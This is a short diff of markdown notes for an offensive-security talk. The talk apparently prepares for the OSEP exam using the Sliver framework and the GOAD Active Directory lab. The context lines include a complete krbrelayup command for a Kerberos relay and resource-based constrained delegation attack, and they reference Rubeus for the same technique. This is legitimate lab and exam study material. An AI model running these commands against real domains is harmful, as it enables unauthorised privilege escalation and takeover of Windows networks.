@@ -4,7 +4,7 @@
 
 This is sequel to [[TALK-Ace-The-OSEP-Exam-with-Sliver-Framework]]
 
-[[Sliver]]
+[[Sliver]] cheatsheet link.
 
 Recap:
 - Recent changes to GOAD
@@ -58,7 +58,6 @@ https://github.com/cube0x0/KrbRelay/tree/main/CheckPort
 krbrelayup '' relay -m rbcd -cls $CLSchooseTrustInstallerItsGoodByServer -p $port -cn '$computerName' -cp 'P@ssword1' -d $domain.$tld
 // Check Machines and Delegations with LDAP for confirmation
 ```
-
 
 Use Rubeus for RBCD
 ```go
